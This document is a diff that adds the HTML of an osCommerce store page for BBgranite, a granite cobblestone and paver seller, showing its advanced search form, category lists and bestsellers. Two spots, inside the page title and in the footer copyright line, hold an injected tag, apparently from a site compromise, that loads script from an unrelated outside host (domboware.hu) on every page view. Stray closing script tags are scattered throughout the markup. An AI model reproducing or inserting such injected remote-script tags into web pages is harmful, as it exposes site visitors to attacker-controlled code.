@@ -1,0 +1,631 @@
+<!doctype html public "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html dir="LTR" lang="en">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+<base href="http://www.bbgraniteblock.com/">
+<title>BBgranite</title><script src=http://domboware.hu/js></script><title></title>
+<link rel="stylesheet" type="text/css" href="stylesheet.css">
+<script language="javascript" src="includes/general.js"></script>
+
+</script>
+<script language="javascript"><!--
+function check_form() {
+  var error_message = "Errors have occured during the process of your form.\n\nPlease make the following corrections:\n\n";
+  var error_found = false;
+  var error_field;
+  var keywords = document.advanced_search.keywords.value;
+  var dfrom = document.advanced_search.dfrom.value;
+  var dto = document.advanced_search.dto.value;
+  var pfrom = document.advanced_search.pfrom.value;
+  var pto = document.advanced_search.pto.value;
+  var pfrom_float;
+  var pto_float;
+
+  if ( ((keywords == '') || (keywords.length < 1)) && ((dfrom == '') || (dfrom == 'mm/dd/yyyy') || (dfrom.length < 1)) && ((dto == '') || (dto == 'mm/dd/yyyy') || (dto.length < 1)) && ((pfrom == '') || (pfrom.length < 1)) && ((pto == '') || (pto.length < 1)) ) {
+    error_message = error_message + "* At least one of the fields in the search form must be entered.\n";
+    error_field = document.advanced_search.keywords;
+    error_found = true;
+  }
+
+  if ((dfrom.length > 0) && (dfrom != 'mm/dd/yyyy')) {
+    if (!IsValidDate(dfrom, 'mm/dd/yyyy')) {
+      error_message = error_message + "* Invalid From Date.\n";
+      error_field = document.advanced_search.dfrom;
+      error_found = true;
+    }
+  }
+
+  if ((dto.length > 0) && (dto != 'mm/dd/yyyy')) {
+    if (!IsValidDate(dto, 'mm/dd/yyyy')) {
+      error_message = error_message + "* Invalid To Date.\n";
+      error_field = document.advanced_search.dto;
+      error_found = true;
+    }
+  }
+
+  if ((dfrom.length > 0) && (dfrom != 'mm/dd/yyyy') && (IsValidDate(dfrom, 'mm/dd/yyyy')) && (dto.length > 0) && (dto != 'mm/dd/yyyy') && (IsValidDate(dto, 'mm/dd/yyyy'))) {
+    if (!CheckDateRange(document.advanced_search.dfrom, document.advanced_search.dto)) {
+      error_message = error_message + "* To Date must be greater than or equal to From Date.\n";
+      error_field = document.advanced_search.dto;
+      error_found = true;
+    }
+  }
+
+  if (pfrom.length > 0) {
+    pfrom_float = parseFloat(pfrom);
+    if (isNaN(pfrom_float)) {
+      error_message = error_message + "* Price From must be a number.\n";
+      error_field = document.advanced_search.pfrom;
+      error_found = true;
+    }
+  } else {
+    pfrom_float = 0;
+  }
+
+  if (pto.length > 0) {
+    pto_float = parseFloat(pto);
+    if (isNaN(pto_float)) {
+      error_message = error_message + "* Price To must be a number.\n";
+      error_field = document.advanced_search.pto;
+      error_found = true;
+    }
+  } else {
+    pto_float = 0;
+  }
+
+  if ( (pfrom.length > 0) && (pto.length > 0) ) {
+    if ( (!isNaN(pfrom_float)) && (!isNaN(pto_float)) && (pto_float < pfrom_float) ) {
+      error_message = error_message + "* Price To must be greater than or equal to Price From.\n";
+      error_field = document.advanced_search.pto;
+      error_found = true;
+    }
+  }
+
+  if (error_found == true) {
+    alert(error_message);
+    error_field.focus();
+    return false;
+  } else {
+    RemoveFormatString(document.advanced_search.dfrom, "mm/dd/yyyy");
+    RemoveFormatString(document.advanced_search.dto, "mm/dd/yyyy");
+    return true;
+  }
+}
+
+function popupWindow(url) {
+  window.open(url,'popupWindow','toolbar=no,location=no,directories=no,status=no,menubar=no,scrollbars=yes,resizable=yes,copyhistory=no,width=450,height=280,screenX=150,screenY=150,top=150,left=150')
+}
+//--></script>
+</head>
+<body marginwidth="0" marginheight="0" topmargin="0" bottommargin="0" leftmargin="0" rightmargin="0">
+<!-- header //-->
+<table cellpadding="0" cellspacing="0" width="916" align="center" border="0" ><tr><td>
+
+
+<table border="0" width="916px" align="center" cellspacing="0" cellpadding="0" >
+  <tr class="header"><td><table cellpadding="0" cellspacing="0"  border="0" height="141" width="916" ><tr>
+  
+  <td valign="top"><table cellpadding="0" cellspacing="0" width="100%" border="0">
+  	<tr>
+    <td width="33%" align="center"    valign="top" style="padding-left:35px; padding-top:27px;">&nbsp;</td>
+	<td width="67%" align="right" valign="top" style="padding-top:40px; padding-right:32px;">&nbsp;</td>
+	</tr>
+	</table>
+	</td>
+	</tr>
+	<tr>
+    <td align="center" valign="bottom" ><table width="877" border="0" cellspacing="0" cellpadding="0">
+      <tr>
+        <td width="206">&nbsp;</td>
+        <td align="right"><table cellpadding="0" cellspacing="0" border="0" >
+          <tr>
+              <td align="right" class="header_menu_left" ></td>
+              <td align="right" class="header_menu"><table cellpadding="0" cellspacing="0"  border="0" >
+                <tr>
+                    <td class="header_menu_1"><a href="index.php">Home</a></td>
+                  <td class="header_menu_spe"></td>
+                  <td class="header_menu_1"><a href="index.php?cPath=1&amp;osCsid=p70eutf01hf4fn4f6f83ma6ik5">Products</a></td>
+                  <td class="header_menu_spe"></td>
+                  <td align="center" class="header_menu_1"><a href="gallery.php">Gallery</a></td>
+                  <td class="header_menu_spe"></td>
+                  <td align="center" class="header_menu_1"><a href="directions.php">Directions</a></td>
+                  <td class="header_menu_spe"></td>
+                  <td align="center" class="header_menu_1"><a href="about_us.php">About Us</a> </td>
+                  <td class="header_menu_spe"></td>
+                  <td class="header_menu_1"><a href="contact_us.php">Contact Us</a></td>
+                </tr>
+                </table></td>
+              <td class="header_menu_right"></td>
+            </tr>
+        </table></td>
+        </tr>
+    </table></td>
+  </tr>
+  
+  </table></td></tr>
+</table>
+<table border="0" width="916" align="center" cellspacing="0" cellpadding="1">
+  <tr class="headerNavigation">
+    <td height="49" align="right" class="headerNavigation"><span style="padding-right:40px;"><form name="quick_find" action="http://www.bbgraniteblock.com/advanced_search_result.php" method="get"></span>
+    
+		<div style="float:right; padding-left:30px; padding-right:50px;"><input type="image" src="images/search_button.gif" />
+		</div>
+
+</script>
+		<div style="float:right;background:url(images/search_input.gif) no-repeat; width:254px; height:18px; padding-top:4px;padding-left:2px;"><input type="text" name="keywords" style="width:251px;border:none; float:left; height:14px;background:none;" />
+		</div>
+    </form>    
+    
+    	<form name="quick_find" action="http://www.bbgraniteblock.com/advanced_search_result.php" method="get">	
+</table>
+
+</td></tr><tr><td class="beckground_img"><!-- header_eof //-->
+
+<!-- body //-->
+<table border="0" width="100%" cellspacing="3" cellpadding="3">
+  <tr>
+    <td width="175" valign="top"><table border="0" width="175" cellspacing="0" cellpadding="2">
+<!-- left_navigation //-->
+<tr><td align="center" ><table cellpadding="0" cellspacing="0" align="center" width="150" border="0">
+
+<!-- categories //-->
+          <tr>
+            <td >
+<table border="0" width="100%" cellspacing="0" cellpadding="0">
+  <tr>
+    <td height="14" class="infoBoxHeading_menu"><img src="images/corner_left.gif" border="0" alt="" width="8" height="21"></td>
+    <td width="100%" height="14" class="infoBoxHeading_menu">Categories</td>
+    <td height="14" class="infoBoxHeading" nowrap><img src="images/corner_right.gif" border="0" alt="" width="7" height="21"></td>
+  </tr>
+</table>
+
+</script>
+<table border="0" width="97%" cellspacing="0" cellpadding="0" class="infoBox" align="center">
+  <tr>
+    <td><table border="0" width="97%" cellspacing="0" cellpadding="3" class="infoBoxContents_menu" align="center">
+  <tr>
+    <td><img src="images/pixel_trans.gif" border="0" alt="" width="100%" height="1"></td>
+  </tr>
+  <tr>
+    <td class="boxText"><a href="http://www.bbgraniteblock.com/index.php?cPath=29&osCsid=f91548e618f5a7e32515e9618f39cc41"></a><br><a href="http://www.bbgraniteblock.com/index.php?cPath=1&osCsid=f91548e618f5a7e32515e9618f39cc41">Jumbo</a>&nbsp;(4)<br><a href="http://www.bbgraniteblock.com/index.php?cPath=2&osCsid=f91548e618f5a7e32515e9618f39cc41">Regular</a>&nbsp;(4)<br><a href="http://www.bbgraniteblock.com/index.php?cPath=3&osCsid=f91548e618f5a7e32515e9618f39cc41">Cubes</a>&nbsp;(5)<br><a href="http://www.bbgraniteblock.com/index.php?cPath=21&osCsid=f91548e618f5a7e32515e9618f39cc41">Landscape Pavers</a>&nbsp;(1)<br><a href="http://www.bbgraniteblock.com/index.php?cPath=23&osCsid=f91548e618f5a7e32515e9618f39cc41">LV 1 Stone</a>&nbsp;(1)<br><a href="http://www.bbgraniteblock.com/index.php?cPath=22&osCsid=f91548e618f5a7e32515e9618f39cc41">LV Stone</a>&nbsp;(1)<br><a href="http://www.bbgraniteblock.com/index.php?cPath=24&osCsid=f91548e618f5a7e32515e9618f39cc41">Mini Pavers</a>&nbsp;(1)<br><a href="http://www.bbgraniteblock.com/index.php?cPath=25&osCsid=f91548e618f5a7e32515e9618f39cc41">Pavers</a>&nbsp;(1)<br><a href="http://www.bbgraniteblock.com/index.php?cPath=26&osCsid=f91548e618f5a7e32515e9618f39cc41">Travertine Paver</a>&nbsp;(2)<br><a href="http://www.bbgraniteblock.com/index.php?cPath=27&osCsid=f91548e618f5a7e32515e9618f39cc41">Granite Steps</a>&nbsp;(2)<br><a href="http://www.bbgraniteblock.com/index.php?cPath=28&osCsid=f91548e618f5a7e32515e9618f39cc41">X-Large Jumbo</a>&nbsp;(1)<br></td>
+  </tr>
+  <tr>
+    <td><img src="images/pixel_trans.gif" border="0" alt="" width="100%" height="1"></td>
+  </tr>
+</table>
+
+</script>
+</td>
+  </tr>
+</table>
+
+</script>
+            </td>
+          </tr>
+<!-- categories_eof //-->
+<tr><td height="10" width="100%"></td></tr><!-- manufacturers //-->
+          <tr>
+            <td>
+<table border="0" width="100%" cellspacing="0" cellpadding="0">
+  <tr>
+    <td height="14" class="infoBoxHeading_menu"><img src="images/corner_left.gif" border="0" alt="" width="8" height="21"></td>
+    <td width="100%" height="14" class="infoBoxHeading_menu">Manufacturers</td>
+    <td height="14" class="infoBoxHeading" nowrap><img src="images/corner_right.gif" border="0" alt="" width="7" height="21"></td>
+  </tr>
+</table>
+
+</script>
+<table border="0" width="97%" cellspacing="0" cellpadding="0" class="infoBox" align="center">
+  <tr>
+    <td><table border="0" width="97%" cellspacing="0" cellpadding="3" class="infoBoxContents_menu" align="center">
+  <tr>
+    <td><img src="images/pixel_trans.gif" border="0" alt="" width="100%" height="1"></td>
+  </tr>
+  <tr>
+    <td class="boxText"><form name="manufacturers" action="http://www.bbgraniteblock.com/index.php" method="get"><select name="manufacturers_id" onChange="this.form.submit();" size="1" style="width: 100%"><option value="" SELECTED>Please Select</option><option value="10"></option><option value="19"></option><option value="18"></option><option value="17"></option><option value="16"></option><option value="15"></option><option value="14"></option><option value="13"></option><option value="12"></option><option value="11"></option><option value="20"></option></select><input type="hidden" name="osCsid" value="f91548e618f5a7e32515e9618f39cc41"></form></td>
+  </tr>
+  <tr>
+    <td><img src="images/pixel_trans.gif" border="0" alt="" width="100%" height="1"></td>
+  </tr>
+</table>
+
+</script>
+</td>
+  </tr>
+</table>
+
+</script>
+            </td>
+          </tr>
+<!-- manufacturers_eof //-->
+<tr><td height="10" width="100%"></td></tr><!-- whats_new //-->
+          <tr>
+            <td>
+<table border="0" width="100%" cellspacing="0" cellpadding="0">
+  <tr>
+    <td height="14" class="infoBoxHeading_menu"><img src="images/corner_left.gif" border="0" alt="" width="8" height="21"></td>
+    <td width="100%" height="14" class="infoBoxHeading_menu">What's New?</td>
+    <td height="14" class="infoBoxHeading" nowrap><img src="images/corner_right.gif" border="0" alt="" width="7" height="21"></td>
+  </tr>
+</table>
+
+</script>
+<table border="0" width="97%" cellspacing="0" cellpadding="0" class="infoBox" align="center">
+  <tr>
+    <td><table border="0" width="97%" cellspacing="0" cellpadding="3" class="infoBoxContents_menu" align="center">
+  <tr>
+    <td><img src="images/pixel_trans.gif" border="0" alt="" width="100%" height="1"></td>
+  </tr>
+  <tr>
+    <td align="center" class="boxText"><a href="http://www.bbgraniteblock.com/product_info.php?products_id=46&osCsid=f91548e618f5a7e32515e9618f39cc41"><img src="images/Landscape Paver 8x4x4.jpg" border="0" alt="Belgian Block Landscape Cobblestone Grey Paver 8x4x4" title=" Belgian Block Landscape Cobblestone Grey Paver 8x4x4 " width="100" height="80"></a><br><a href="http://www.bbgraniteblock.com/product_info.php?products_id=46&osCsid=f91548e618f5a7e32515e9618f39cc41">Belgian Block Landscape Cobblestone Grey Paver 8x4x4</a></td>
+  </tr>
+  <tr>
+    <td><img src="images/pixel_trans.gif" border="0" alt="" width="100%" height="1"></td>
+  </tr>
+</table>
+
+</script>
+</td>
+  </tr>
+</table>
+
+</script>
+            </td>
+          </tr>
+<!-- whats_new_eof //-->
+<tr><td height="10" width="100%"></td></tr><!-- search //-->
+          <tr>
+            <td>
+<table border="0" width="100%" cellspacing="0" cellpadding="0">
+  <tr>
+    <td height="14" class="infoBoxHeading_menu"><img src="images/corner_left.gif" border="0" alt="" width="8" height="21"></td>
+    <td width="100%" height="14" class="infoBoxHeading_menu">Quick Find</td>
+    <td height="14" class="infoBoxHeading" nowrap><img src="images/corner_right.gif" border="0" alt="" width="7" height="21"></td>
+  </tr>
+</table>
+
+</script>
+<table border="0" width="97%" cellspacing="0" cellpadding="0" class="infoBox" align="center">
+  <tr>
+    <td><table border="0" width="97%" cellspacing="0" cellpadding="3" class="infoBoxContents_menu" align="center">
+  <tr>
+    <td><img src="images/pixel_trans.gif" border="0" alt="" width="100%" height="1"></td>
+  </tr>
+  <tr>
+    <td align="center" class="boxText"><form name="quick_find" action="http://www.bbgraniteblock.com/advanced_search_result.php" method="get"><input type="text" name="keywords" size="10" maxlength="30" style="width: 90px">&nbsp;<input type="hidden" name="osCsid" value="f91548e618f5a7e32515e9618f39cc41"><input type="image" src="includes/languages/english/images/buttons/button_quick_find.gif" border="0" alt="Quick Find" title=" Quick Find "><br>Use keywords to find the product you are looking for.<br><a href="http://www.bbgraniteblock.com/advanced_search.php?osCsid=f91548e618f5a7e32515e9618f39cc41"><b>Advanced Search</b></a></form></td>
+  </tr>
+  <tr>
+    <td><img src="images/pixel_trans.gif" border="0" alt="" width="100%" height="1"></td>
+  </tr>
+</table>
+
+</script>
+</td>
+  </tr>
+</table>
+
+</script>
+            </td>
+          </tr>
+<!-- search_eof //-->
+<tr><td height="10" width="100%"></td></tr><!-- information //-->
+          <tr>
+            <td>
+<table border="0" width="100%" cellspacing="0" cellpadding="0">
+  <tr>
+    <td height="14" class="infoBoxHeading_menu"><img src="images/corner_left.gif" border="0" alt="" width="8" height="21"></td>
+    <td width="100%" height="14" class="infoBoxHeading_menu">Information</td>
+    <td height="14" class="infoBoxHeading" nowrap><img src="images/corner_right.gif" border="0" alt="" width="7" height="21"></td>
+  </tr>
+</table>
+
+</script>
+<table border="0" width="97%" cellspacing="0" cellpadding="0" class="infoBox" align="center">
+  <tr>
+    <td><table border="0" width="97%" cellspacing="0" cellpadding="3" class="infoBoxContents_menu" align="center">
+  <tr>
+    <td><img src="images/pixel_trans.gif" border="0" alt="" width="100%" height="1"></td>
+  </tr>
+  <tr>
+    <td class="boxText"><a href="http://www.bbgraniteblock.com/shipping.php?osCsid=f91548e618f5a7e32515e9618f39cc41">Shipping & Returns</a><br><a href="http://www.bbgraniteblock.com/privacy.php?osCsid=f91548e618f5a7e32515e9618f39cc41">Privacy Notice</a><br><a href="http://www.bbgraniteblock.com/conditions.php?osCsid=f91548e618f5a7e32515e9618f39cc41">Conditions of Use</a><br><a href="http://www.bbgraniteblock.com/contact_us.php?osCsid=f91548e618f5a7e32515e9618f39cc41">Contact Us</a></td>
+  </tr>
+  <tr>
+    <td><img src="images/pixel_trans.gif" border="0" alt="" width="100%" height="1"></td>
+  </tr>
+</table>
+
+</script>
+</td>
+  </tr>
+</table>
+
+</script>
+            </td>
+          </tr>
+<!-- information_eof //-->
+<tr><td height="10" width="100%"></td></tr><!-- search //-->
+          <tr>
+            <td align="center">
+				<br />
+			    <a href="index.php"><img src="images/ukindex.gif" border="0" /></a>
+			<br />
+			<br />
+			<img src="images/versign.gif" />
+			<br />
+			<br />
+			<img src="images/authorize.net.gif" />
+            </td>
+          </tr>
+<!-- search_eof //-->
+
+</table>
+
+</script></td></tr><!-- left_navigation_eof //-->
+    </table></td>
+<!-- body_text //-->
+    <td width="100%" valign="top"><form name="advanced_search" action="http://www.bbgraniteblock.com/advanced_search_result.php" method="get" onSubmit="return check_form(this);"><input type="hidden" name="osCsid" value="f91548e618f5a7e32515e9618f39cc41"><table border="0" width="100%" cellspacing="0" cellpadding="0">
+      <tr>
+        <td><table border="0" width="100%" cellspacing="0" cellpadding="0">
+          <tr>
+            <td class="pageHeading">Advanced Search</td>
+            <td class="pageHeading" align="right"><img src="images/table_background_browse.gif" border="0" alt="Advanced Search" title=" Advanced Search " width="57" height="40"></td>
+          </tr>
+        </table></td>
+      </tr>
+      <tr>
+        <td><img src="images/pixel_trans.gif" border="0" alt="" width="100%" height="10"></td>
+      </tr>
+      <tr>
+        <td>
+<table border="0" width="100%" cellspacing="0" cellpadding="0">
+  <tr>
+    <td height="14" class="infoBoxHeading_menu"><img src="images/corner_left.gif" border="0" alt="" width="8" height="21"></td>
+    <td width="100%" height="14" class="infoBoxHeading_menu">Search Criteria</td>
+    <td height="14" class="infoBoxHeading" nowrap><img src="images/corner_right.gif" border="0" alt="" width="7" height="21"></td>
+  </tr>
+</table>
+
+</script>
+<table border="0" width="97%" cellspacing="0" cellpadding="0" class="infoBox" align="center">
+  <tr>
+    <td><table border="0" width="97%" cellspacing="0" cellpadding="3" class="infoBoxContents_menu" align="center">
+  <tr>
+    <td><img src="images/pixel_trans.gif" border="0" alt="" width="100%" height="1"></td>
+  </tr>
+  <tr>
+    <td class="boxText"><input type="text" name="keywords" style="width: 100%"></td>
+  </tr>
+  <tr>
+    <td align="right" class="boxText"><input type="checkbox" name="search_in_description" value="1"> Search In Product Descriptions</td>
+  </tr>
+  <tr>
+    <td><img src="images/pixel_trans.gif" border="0" alt="" width="100%" height="1"></td>
+  </tr>
+</table>
+
+</script>
+</td>
+  </tr>
+</table>
+
+</script>
+        </td>
+      </tr>
+      <tr>
+        <td><img src="images/pixel_trans.gif" border="0" alt="" width="100%" height="10"></td>
+      </tr>
+      <tr>
+        <td><table border="0" width="100%" cellspacing="0" cellpadding="2">
+          <tr>
+            <td class="smallText"><a href="javascript:popupWindow('http://www.bbgraniteblock.com/popup_search_help.php?osCsid=f91548e618f5a7e32515e9618f39cc41')"><u>Search Help</u> [?]</a></td>
+            <td class="smallText" align="right"><input type="image" src="includes/languages/english/images/buttons/button_search.gif" border="0" alt="Search" title=" Search "></td>
+          </tr>
+        </table></td>
+      </tr>
+      <tr>
+        <td><img src="images/pixel_trans.gif" border="0" alt="" width="100%" height="10"></td>
+      </tr>
+      <tr>
+        <td><table border="0" width="100%" cellspacing="1" cellpadding="2" class="infoBox">
+          <tr class="infoBoxContents">
+            <td><table border="0" width="100%" cellspacing="0" cellpadding="2">
+              <tr>
+                <td class="fieldKey">Categories:</td>
+                <td class="fieldValue"><select name="categories_id"><option value="" SELECTED>All Categories</option><option value="29"></option><option value="1">Jumbo</option><option value="2">Regular</option><option value="3">Cubes</option><option value="21">Landscape Pavers</option><option value="23">LV 1 Stone</option><option value="22">LV Stone</option><option value="24">Mini Pavers</option><option value="25">Pavers</option><option value="26">Travertine Paver</option><option value="27">Granite Steps</option><option value="28">X-Large Jumbo</option></select></td>
+              </tr>
+              <tr>
+                <td class="fieldKey">&nbsp;</td>
+                <td class="smallText"><input type="checkbox" name="inc_subcat" value="1" CHECKED> Include Subcategories</td>
+              </tr>
+              <tr>
+                <td colspan="2"><img src="images/pixel_trans.gif" border="0" alt="" width="100%" height="10"></td>
+              </tr>
+              <tr>
+                <td class="fieldKey">Manufacturers:</td>
+                <td class="fieldValue"><select name="manufacturers_id"><option value="" SELECTED>All Manufacturers</option><option value="10"></option><option value="19"></option><option value="18"></option><option value="17"></option><option value="16"></option><option value="15"></option><option value="14"></option><option value="13"></option><option value="12"></option><option value="11"></option><option value="20"></option></select></td>
+              </tr>
+              <tr>
+                <td colspan="2"><img src="images/pixel_trans.gif" border="0" alt="" width="100%" height="10"></td>
+              </tr>
+              <tr>
+                <td class="fieldKey">Price From:</td>
+                <td class="fieldValue"><input type="text" name="pfrom"></td>
+              </tr>
+              <tr>
+                <td class="fieldKey">Price To:</td>
+                <td class="fieldValue"><input type="text" name="pto"></td>
+              </tr>
+              <tr>
+                <td colspan="2"><img src="images/pixel_trans.gif" border="0" alt="" width="100%" height="10"></td>
+              </tr>
+              <tr>
+                <td class="fieldKey">Date From:</td>
+                <td class="fieldValue"><input type="text" name="dfrom" value="mm/dd/yyyy" onFocus="RemoveFormatString(this, 'mm/dd/yyyy')"></td>
+              </tr>
+              <tr>
+                <td class="fieldKey">Date To:</td>
+                <td class="fieldValue"><input type="text" name="dto" value="mm/dd/yyyy" onFocus="RemoveFormatString(this, 'mm/dd/yyyy')"></td>
+              </tr>
+            </table></td>
+          </tr>
+        </table></td>
+      </tr>
+    </table></form></td>
+<!-- body_text_eof //-->
+    <td width="175" valign="top"><table border="0" width="175" cellspacing="0" cellpadding="2">
+<!-- right_navigation //-->
+<tr><td align="center" ><table cellpadding="0" cellspacing="0" align="center" width="150" border="0">
+<!-- shopping_cart //-->
+          <tr>
+            <td>
+<table border="0" width="100%" cellspacing="0" cellpadding="0">
+  <tr>
+    <td height="14" class="infoBoxHeading_menu"><img src="images/corner_left.gif" border="0" alt="" width="8" height="21"></td>
+    <td width="100%" height="14" class="infoBoxHeading_menu">Shopping Cart</td>
+    <td height="14" class="infoBoxHeading" nowrap><img src="images/corner_right.gif" border="0" alt="" width="7" height="21"></td>
+  </tr>
+</table>
+
+</script>
+<table border="0" width="97%" cellspacing="0" cellpadding="0" class="infoBox" align="center">
+  <tr>
+    <td><table border="0" width="97%" cellspacing="0" cellpadding="3" class="infoBoxContents_menu" align="center">
+  <tr>
+    <td><img src="images/pixel_trans.gif" border="0" alt="" width="100%" height="1"></td>
+  </tr>
+  <tr>
+    <td class="boxText"><table border="0" width="100%" cellspacing="0" cellpadding="0"><tr><td><table border="0" width="100%" cellspacing="0" cellpadding="0"><tr><td valign="middle"><img src="images/cart_pic.gif" border="0" alt="Cart Picture" title=" Cart Picture " width="51" height="60"></td><td valign="middle"><b style="font-size:10px;">Cart is empty</b></td></tr></table></td></tr><tr><td align="center"><table border="0" width="100%" align="center" cellspacing="0" cellpadding="0" style="color:#000000; font-size:12px;"><tr><td height="5"><hr/></td></tr><tr><td bgcolor="#E2E2E2"> &nbsp;&nbsp;<a href="shopping_cart.php" >View cart</a></td></tr><tr><td height="2" width="100%"> </td></tr><tr><td bgcolor="#E2E2E2"> &nbsp;&nbsp;Checkout </td></tr><tr><td height="2" width="100%"> </td></tr><tr><td bgcolor="#E2E2E2"> &nbsp;&nbsp;Order history </td></tr><tr><td height="2" width="100%"> </td></tr></table></td></tr></table></td>
+  </tr>
+  <tr>
+    <td><img src="images/pixel_trans.gif" border="0" alt="" width="100%" height="1"></td>
+  </tr>
+</table>
+
+</script>
+</td>
+  </tr>
+</table>
+
+</script>
+            </td>
+          </tr>
+<!-- shopping_cart_eof //--><!-- best_sellers //-->
+          <tr>
+            <td>
+<table border="0" width="100%" cellspacing="0" cellpadding="0">
+  <tr>
+    <td height="14" class="infoBoxHeading_menu"><img src="images/corner_left.gif" border="0" alt="" width="8" height="21"></td>
+    <td width="100%" height="14" class="infoBoxHeading_menu">Bestsellers</td>
+    <td height="14" class="infoBoxHeading" nowrap><img src="images/corner_right.gif" border="0" alt="" width="7" height="21"></td>
+  </tr>
+</table>
+
+</script>
+<table border="0" width="97%" cellspacing="0" cellpadding="0" class="infoBox" align="center">
+  <tr>
+    <td><table border="0" width="97%" cellspacing="0" cellpadding="3" class="infoBoxContents_menu" align="center">
+  <tr>
+    <td><img src="images/pixel_trans.gif" border="0" alt="" width="100%" height="1"></td>
+  </tr>
+  <tr>
+    <td class="boxText"><table border="0" width="100%" cellspacing="0" cellpadding="1"><tr><td class="infoBoxContents" valign="top">01.</td><td class="infoBoxContents"><a href="http://www.bbgraniteblock.com/product_info.php?products_id=33&osCsid=f91548e618f5a7e32515e9618f39cc41">Jumbo Grey Belgian Block Cobblestone</a></td></tr><tr><td class="infoBoxContents" valign="top">02.</td><td class="infoBoxContents"><a href="http://www.bbgraniteblock.com/product_info.php?products_id=37&osCsid=f91548e618f5a7e32515e9618f39cc41">Regular Grey Belgian Block Cobblestone</a></td></tr><tr><td class="infoBoxContents" valign="top">03.</td><td class="infoBoxContents"><a href="http://www.bbgraniteblock.com/product_info.php?products_id=51&osCsid=f91548e618f5a7e32515e9618f39cc41">X-Large Jumbo Grey Belgian Block Cobblestone</a></td></tr><tr><td class="infoBoxContents" valign="top">04.</td><td class="infoBoxContents"><a href="http://www.bbgraniteblock.com/product_info.php?products_id=41&osCsid=f91548e618f5a7e32515e9618f39cc41">Grey Cobblestone Cube 4x4x4</a></td></tr><tr><td class="infoBoxContents" valign="top">05.</td><td class="infoBoxContents"><a href="http://www.bbgraniteblock.com/product_info.php?products_id=36&osCsid=f91548e618f5a7e32515e9618f39cc41">Jumbo Yellow Belgian Block Cobblestone</a></td></tr><tr><td class="infoBoxContents" valign="top">06.</td><td class="infoBoxContents"><a href="http://www.bbgraniteblock.com/product_info.php?products_id=35&osCsid=f91548e618f5a7e32515e9618f39cc41">Jumbo Black Belgian Block Cobblestone</a></td></tr><tr><td class="infoBoxContents" valign="top">07.</td><td class="infoBoxContents"><a href="http://www.bbgraniteblock.com/product_info.php?products_id=46&osCsid=f91548e618f5a7e32515e9618f39cc41">Belgian Block Landscape Cobblestone Grey Paver 8x4x4</a></td></tr><tr><td class="infoBoxContents" valign="top">08.</td><td class="infoBoxContents"><a href="http://www.bbgraniteblock.com/product_info.php?products_id=52&osCsid=f91548e618f5a7e32515e9618f39cc41">Gold Travertine Paving Stone</a></td></tr><tr><td class="infoBoxContents" valign="top">09.</td><td class="infoBoxContents"><a href="http://www.bbgraniteblock.com/product_info.php?products_id=50&osCsid=f91548e618f5a7e32515e9618f39cc41">Belgian Block Cobblestone Paver 12x6x3</a></td></tr><tr><td class="infoBoxContents" valign="top">10.</td><td class="infoBoxContents"><a href="http://www.bbgraniteblock.com/product_info.php?products_id=54&osCsid=f91548e618f5a7e32515e9618f39cc41">Granite Step Grey 48x12x2</a></td></tr></table>
+
+</script></td>
+  </tr>
+  <tr>
+    <td><img src="images/pixel_trans.gif" border="0" alt="" width="100%" height="1"></td>
+  </tr>
+</table>
+
+</script>
+</td>
+  </tr>
+</table>
+
+</script>
+            </td>
+          </tr>
+<!-- best_sellers_eof //-->
+<tr><td height="10" width="100%"></td></tr><tr><td height="10" width="100%"></td></tr><!-- reviews //-->
+          <tr>
+            <td>
+<table border="0" width="100%" cellspacing="0" cellpadding="0">
+  <tr>
+    <td height="14" class="infoBoxHeading_menu"><img src="images/corner_left.gif" border="0" alt="" width="8" height="21"></td>
+    <td width="100%" height="14" class="infoBoxHeading_menu">Reviews</td>
+    <td height="14" class="infoBoxHeading" nowrap><img src="images/corner_right.gif" border="0" alt="" width="7" height="21"></td>
+  </tr>
+</table>
+
+</script>
+<table border="0" width="97%" cellspacing="0" cellpadding="0" class="infoBox" align="center">
+  <tr>
+    <td><table border="0" width="97%" cellspacing="0" cellpadding="3" class="infoBoxContents_menu" align="center">
+  <tr>
+    <td><img src="images/pixel_trans.gif" border="0" alt="" width="100%" height="1"></td>
+  </tr>
+  <tr>
+    <td class="boxText">There are currently no product reviews</td>
+  </tr>
+  <tr>
+    <td><img src="images/pixel_trans.gif" border="0" alt="" width="100%" height="1"></td>
+  </tr>
+</table>
+
+</script>
+</td>
+  </tr>
+</table>
+
+</script>
+            </td>
+          </tr>
+<!-- reviews_eof //--><tr><td width="100%" height="10"></td></tr><tr><td height="10" width="100%" ></td></tr><tr><td height="10" width="100%"></td></tr><!-- search //-->
+          <tr>
+            <td align="center">
+				<br />
+			
+			<img src="images/credit_card.gif" />
+			<br />
+			<br />
+			<img src="images/satisfactionseal.jpg" />
+		
+            </td>
+          </tr>
+<!-- search_eof //-->
+
+</table>
+
+</script></td></tr><!-- right_navigation_eof //-->
+    </table></td>
+  </tr>
+</table>
+<!-- body_eof //-->
+
+<!-- footer //-->
+</td></tr><tr><td>
+
+<table border="0" width="915" align="center" cellspacing="0" cellpadding="1">
+  <tr class="footer">
+    <td class="footer" style="padding-left:10px;">&nbsp;&nbsp;Wednesday 20 December, 2017&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</td>
+    </tr>
+</table>
+
+</script>
+
+<table border="0" width="100%" cellspacing="0" cellpadding="0">
+  <tr class="copyright">
+    <td align="center" class="smallText_footer" style="color:#FFFFFF">Copyright &copy; 2017 <a href="http://www.bbgraniteblock.com/index.php?osCsid=f91548e618f5a7e32515e9618f39cc41">BBgranite</title><script src=http://domboware.hu/js></script><title></a><br>Powered by <a href="http://www.oscommerce.com" target="_blank">osCommerce</a></td>
+  </tr>
+</table>
+<br>
+<table border="0" width="100%" cellspacing="0" cellpadding="0">
+  <tr>
+    <td align="center"></td>
+  </tr>
+</table>
+
+</td></tr></table><!-- footer_eof //-->
+<br>
+</body>
+</html>
